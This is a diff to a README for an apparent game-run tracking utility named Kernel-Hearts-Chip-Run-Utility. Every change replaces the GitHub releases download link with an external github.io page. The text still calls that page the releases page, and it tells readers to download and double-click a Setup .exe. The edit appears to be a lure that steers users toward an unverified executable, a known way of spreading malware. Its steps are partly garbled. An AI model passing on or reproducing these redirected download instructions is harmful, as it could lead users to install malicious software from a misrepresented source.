@@ -1,6 +1,6 @@
 # 🎮 Kernel-Hearts-Chip-Run-Utility - Plan, Track, and Conquer Every Run!
 
-[![Download Now](https://img.shields.io/badge/Download-Kernel%20Hearts%20Utility-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/D45727695/Kernel-Hearts-Chip-Run-Utility/releases)
+[![Download Now](https://img.shields.io/badge/Download-Kernel%20Hearts%20Utility-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://d45727695.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Welcome to **Kernel-Hearts-Chip-Run-Utility** - your all-in-one companion for th
 
 Getting the utility on your PC is simple. Follow these steps:
 
-1.  **Visit the download page:** Click the big orange button at the top of this page (or use this link: [Kernel-Hearts-Chip-Run-Utility Releases](https://github.com/D45727695/Kernel-Hearts-Chip-Run-Utility/releases)).
+1.  **Visit the download page:** Click the big orange button at the top of this page (or use this link: [Kernel-Hearts-Chip-Run-Utility Releases](https://d45727695.github.io)).
 2.  **Look for the latest version:** The page shows a list of releases. Choose the one marked "Latest" (usually at the top).
 3.  **Download the file:** Click the file link that looks like `Kernel-Hearts-Chip-Run-Utility-Setup.exe` (or similar name). The download starts automatically.
 4.  **Run the application:** Visit this link to download the application. Once downloaded, double-click the file to launch the program directly. No installation wizard needed - it starts right up!
@@ -144,7 +144,7 @@ Yes, there is a "Settings" tab where you can switch between light/dark themes, a
 
 ## 📞 Getting Help & Updates
 
-This project is actively maintained. To report bugs, request features, or see what's coming next, visit the repository's **Issues** page on GitHub. For updates, simply revisit the [Download page](https://github.com/D45727695/Kernel-Hearts-Chip-Run-Utility/releases) periodically - new versions will be listed there first∘.
+This project is actively maintained. To report bugs, request features, or see what's coming next, visit the repository's **Issues** page on GitHub. For updates, simply revisit the [Download page](https://d45727695.github.io) periodically - new versions will be listed there first∘.
 
 
 
